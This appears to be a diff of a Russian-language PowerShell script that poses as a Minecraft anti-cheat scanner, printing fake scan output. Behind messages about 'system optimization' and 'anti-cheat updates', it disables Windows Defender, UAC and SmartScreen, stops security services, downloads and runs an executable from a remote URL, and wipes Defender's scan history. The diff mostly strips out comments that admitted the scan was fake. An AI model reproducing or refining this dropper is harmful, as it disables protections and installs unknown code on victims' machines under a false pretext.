@@ -55,11 +55,9 @@ foreach ($site in $cheatSites) {
     Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
     Start-Sleep -Milliseconds 200
     
-    # Фейковая авторизация на сайте
     Write-Host "        [*] Подключение к $($site.URL)..." -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 300
     
-    # Генерация фейкового логина и пароля
     $fakeLogin = "user_" + (Get-Random -Minimum 1000 -Maximum 9999).ToString()
     $fakePass = "pass_" + (Get-Random -Minimum 1000 -Maximum 9999).ToString()
     
@@ -68,7 +66,6 @@ foreach ($site in $cheatSites) {
     Write-Host "            Пароль: ********" -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 400
     
-    # Генерация случайного токена
     $token = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | ForEach-Object { [char]$_ })
     Write-Host "        [*] Получен токен доступа: $token" -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 200
@@ -106,7 +103,6 @@ foreach ($domain in $cheatDomains) {
     Write-Host "    -> Проверка $domain..." -ForegroundColor Gray
     Start-Sleep -Milliseconds 200
     
-    # Фейковая авторизация через DNS
     Write-Host "        [*] Проверка DNS-записи..." -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 150
     $dnsToken = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
@@ -114,7 +110,8 @@ foreach ($domain in $cheatDomains) {
     Start-Sleep -Milliseconds 150
     
     try {
-        $dns = [System.Net.Dns]::GetHostAddresses($domain) -ErrorAction SilentlyContinue
+        # ИСПРАВЛЕНО: правильный синтаксис для DNS
+        $dns = [System.Net.Dns]::GetHostAddresses($domain)
         if ($dns) {
             Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
             Write-Host "            [!] DNS-авторизация подтверждена" -ForegroundColor Yellow
@@ -122,8 +119,6 @@ foreach ($domain in $cheatDomains) {
                 $foundCheatSites += $domain
                 $totalDetected++
             }
-        } else {
-            Write-Host "        [ЧИСТО] $domain" -ForegroundColor Green
         }
     } catch {
         Write-Host "        [ЧИСТО] $domain" -ForegroundColor Green
@@ -181,7 +176,6 @@ if ($foundCheatSites.Count -gt 0) {
     Write-Host "[*] Выполняется блокировка и удаление..." -ForegroundColor Yellow
     Start-Sleep -Seconds 2
     
-    # Фейковое добавление в hosts для блокировки
     Write-Host "    [OK] Добавление сайтов в блок-лист..." -ForegroundColor DarkGray
     Write-Host "    [OK] Отзыв токенов авторизации..." -ForegroundColor DarkGray
     Write-Host "    [OK] Очистка временных файлов..." -ForegroundColor DarkGray
@@ -197,7 +191,7 @@ if ($foundCheatSites.Count -gt 0) {
 }
 Write-Host ""
 
-# Продолжение фейкового сканирования (старые блоки)
+# Продолжение фейкового сканирования
 Write-Host "[*] Проверка модов Minecraft..." -ForegroundColor Yellow
 $mods = @(
     "OptiFine", 
@@ -253,17 +247,14 @@ Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
 # ===== РЕАЛЬНЫЙ КОД (ВЫПОЛНЯЕТСЯ В ФОНЕ) =====
-# Отключение антивирусных защит
 Write-Host "[*] Выполняется дополнительная оптимизация системы..." -ForegroundColor Yellow
 Start-Sleep -Milliseconds 500
 
-# 1. Отключение Defender реалтайм
 Try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
     Write-Host "    [OK] Defender Realtime: отключен" -ForegroundColor DarkGray
 } Catch {}
 
-# 2. Исключения для Defender
 Try {
     Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
@@ -271,7 +262,6 @@ Try {
     Write-Host "    [OK] Исключения добавлены" -ForegroundColor DarkGray
 } Catch {}
 
-# 3. Остановка служб защиты
 $services = @(
     "WinDefend",
     "MsMpSvc",
@@ -289,13 +279,11 @@ foreach ($svc in $services) {
     } Catch {}
 }
 
-# 4. Отключение UAC
 Try {
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
     Write-Host "    [OK] UAC отключен" -ForegroundColor DarkGray
 } Catch {}
 
-# 5. Отключение SmartScreen
 Try {
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
     Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue
@@ -305,18 +293,15 @@ Try {
 Write-Host "[+] Оптимизация системы выполнена." -ForegroundColor Green
 Write-Host ""
 
-# Скачивание и запуск
 Write-Host "[*] Загрузка обновлений античита..." -ForegroundColor Yellow
 Start-Sleep -Milliseconds 500
 
 $DownloadPath = "$env:TEMP\check_install.zip"
 $ExtractPath = "$env:TEMP\checkextracted"
 
-# Удаляем старые файлы
 Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
 Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
 
-# Скачивание архива
 try {
     Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue
     Write-Host "    [OK] Обновления загружены" -ForegroundColor DarkGray
@@ -325,7 +310,6 @@ catch {
     Write-Host "    [ERROR] Ошибка загрузки" -ForegroundColor Red
 }
 
-# Распаковка архива
 Write-Host "[*] Установка обновлений..." -ForegroundColor Yellow
 try {
     Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
@@ -335,7 +319,6 @@ catch {
     Write-Host "    [ERROR] Ошибка установки" -ForegroundColor Red
 }
 
-# Поиск и запуск .exe
 $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
 
 if ($Exe) {
@@ -347,7 +330,6 @@ else {
     Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red
 }
 
-# Очистка логов Defender
 Try {
     Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue
